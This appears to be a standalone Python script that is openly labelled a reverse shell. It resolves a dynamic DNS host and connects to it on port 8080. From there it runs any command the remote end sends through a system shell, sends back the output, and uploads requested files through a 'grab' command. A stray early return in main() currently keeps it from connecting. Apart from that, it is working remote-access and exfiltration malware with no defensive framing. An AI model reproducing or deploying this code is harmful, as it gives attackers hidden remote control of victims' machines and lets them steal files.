#!/usr/bin/env python
# Filename: ddns_reverse_shell.py
# This program is optimized for Python 3.4
# Description: Reverse shell implementation that connects to a dynamic dns host instead of an IP
#   counterpart: None


import socket
import subprocess
import os

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found.'.encode())
        
def connecting(ip):
    s = socket.socket()
    s.connect((ip, 8080))

    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        else:
            CMD = subprocess.Popen(command.decode(),
                                   shell=True,
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())
def main():
    ip = socket.gethostbyname('stfim.ddns.net')
    print (ip)
    return
    connecting(ip)
main()
